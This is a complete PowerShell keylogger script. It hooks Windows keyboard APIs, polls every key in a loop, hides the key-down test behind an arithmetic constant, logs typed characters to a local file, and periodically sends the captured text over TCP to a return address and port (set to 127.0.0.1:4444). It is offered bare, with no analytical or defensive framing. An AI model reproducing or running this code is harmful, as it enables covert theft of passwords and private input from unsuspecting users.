
$Sig1 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@
$Sig2 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
'@
$Sig3 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
'@
$Sig4 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
Function Main-Run {
	Process {
		
		Add-Type -MemberDefinition $Sig1 -Name Keyboard -Namespace PsOneApi
		Add-Type -MemberDefinition $Sig2 -Name MapVkey -Namespace PsOneApi
		Add-Type -MemberDefinition $Sig3 -Name GetKBS -Namespace PsOneApi
		Add-Type -MemberDefinition $Sig4 -Name ToUni -Namespace PsOneApi

		$file = ".\out.txt"
		$buffer = 10
		
		while($true){
			Start-Sleep -Milliseconds 50
			for ($key_num=8; $key_num -le 254; $key_num++){
				$key_pressed = [PsOneApi.Keyboard]::GetAsyncKeyState($key_num)
				$thing = -(15999 + 16768)
				$val = ($key_pressed -eq $thing)
				if ($val) {
					$vk = [PsOneApi.MapVkey]::MapVirtualKey($key_num,3)
					$kb = New-Object Byte[] 256
					$kbs = [PsOneApi.GetKBS]::GetKeyboardState($kb)
					$t_char = New-Object -TypeName System.Text.StringBuilder
					$uni_operation = [PsOneApi.ToUni]::ToUnicode($key_num,$vk,$kb,$t_char,$t_char.Capacity,0)
					if ($uni_operation){
						Write-Host $uni_operation $t_char
						Add-Content -Path $file -Value $t_char -NoNewLine
					}
					$length = (Get-Item $file).Length
					
					if ($length -gt $buffer){
						if ($job -and $job.State -eq "Running") {
							Write-Host "Job is still running"
							Receive-Job -Job $job
						} else {
							$job = Start-Job -ScriptBlock{
								Function Send-TCPMessage {
									Param ( 
										[Parameter(Mandatory=$true, Position=0)][ValidateNotNullOrEmpty()][string] $IP,
										[Parameter(Mandatory=$true, Position=1)][int] $Port, 
										[Parameter(Mandatory=$true, Position=2)][string] $Message
									) 
									Process {
										$Address = [System.Net.IPAddress]::Parse($IP) 
										$Socket = New-Object System.Net.Sockets.TCPClient($Address,$Port) 
										$Stream = $Socket.GetStream() 
										$Writer = New-Object System.IO.StreamWriter($Stream)
										$Message | % {
											$Writer.WriteLine($_)
											$Writer.Flush()
										}
										$Stream.Close()
										$Socket.Close()
									}
								}
								$ret_addr = "127.0.0.1"
								$ret_port = 4444
								$file = ".\out.txt"
								$content = [System.IO.File]::ReadAllText($file)
								try{
									Send-TCPMessage -IP $ret_addr -Port $ret_port -Message $content
									Set-Content -Path $file -Value ""
									exit
								}
								catch{
									$_ | Out-File ".\error.log"
									exit
								}
							}
						}
					}
				}
			}
		}
	}
}
Main-Run
